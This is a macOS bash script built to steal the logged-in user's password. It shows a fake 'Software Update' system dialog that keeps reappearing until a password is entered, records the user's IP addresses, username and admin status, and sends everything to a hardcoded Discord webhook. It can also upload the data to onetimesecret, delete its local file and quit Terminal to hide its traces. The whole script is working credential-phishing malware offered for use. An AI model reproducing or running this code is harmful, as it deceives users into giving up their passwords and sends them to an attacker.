#!/usr/bin/env bash

externalip=$(curl -s http://ipecho.net/plain)
internalip=$(ifconfig en0 | grep inet | awk '$1=="inet" {print $2}')
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')
webhook_url="https://discord.com/api/webhooks/1356139736552570900/GsKXFNHTYx7Ej7D36VnzpotosTaIhxZk4Qb9SMySCM052SQ371xSdNH2Bu_oWexZkmxR"

#Runtime Default Values
promptcount=2
cflag=
oflag=
nflag=
hflag=

read -r -d '' applescriptCode <<'EOF'
set dialogText to ""
set username to long user name of (system info)
set msg1 to "Software Update is trying to authenticate user.

Enter the password for the user "
set msg2 to " to allow this."

repeat
    try
        set dialogResult to display dialog "" & msg1 & username & msg2 with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Preferences" default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK"
        set dialogText to text returned of dialogResult
        if dialogText is not "" then
            exit repeat
        end if
    on error
        -- User clicked Cancel or closed the dialog, show it again
    end try
end repeat

return dialogText
EOF

# Is this logged in user an admin?
if dscl . -read /Groups/admin GroupMembership | awk '{print $2, $3, $4, $5, $6, $7, $8, $9}' | grep -q "$username"; then
    isadmin="(user is admin)"
else
    isadmin="(user is not admin)"
fi

#Gathers the intial information
capture=$(echo -e ExternalIP="$externalip" + InternalIP="$internalip" + "$isadmin" + username="$username" \\n\\r_________________________________________________________________________________________\\n\\r\\n\\r);

#Switch command line arguments
while getopts con:h options
do
    case $options in
    c)    cflag=1;; #Clean up afterwards
    o)    oflag=1;; #Onetimesecret
    h)    hflag=1;; #Hide terminal after execution
    n)    nflag=1;  #Number of times to prompt
          nval="$OPTARG";;
    ?)   printf "Usage: %s: [-n value] args\n" $0
            exit 2;;
    esac
done

#Flag to set the number of times to prompt
if [ ! -z "$nflag" ]; then
    promptcount=$(($nval - 1))
fi

for i in $( eval echo {0..$promptcount} )
do
dialogText=$(osascript -e "$applescriptCode");
capture="$capture$(echo -e password = "$dialogText" \\n\\r)";
done

# Send to Discord webhook
curl -H "Content-Type: application/json" -d "{\"content\":\"$capture\"}" $webhook_url

#Onetimesecret flag to store the password
if [ ! -z "$oflag" ]; then
metadata=$(curl -d 'secret='"$capture"'&ttl=3600' https://onetimesecret.com/api/v1/share | jq -r '.metadata_key')
printf "https://onetimesecret.com/private/$metadata\n"
else
    echo "$capture" >> pass.txt
fi

#Clean up flag to delete the password file
if [ ! -z "$cflag" ]; then
    rm pass.txt
fi

# Hide terminal if flag is set
if [ ! -z "$hflag" ]; then
    osascript -e 'tell application "Terminal" to quit' &
fi
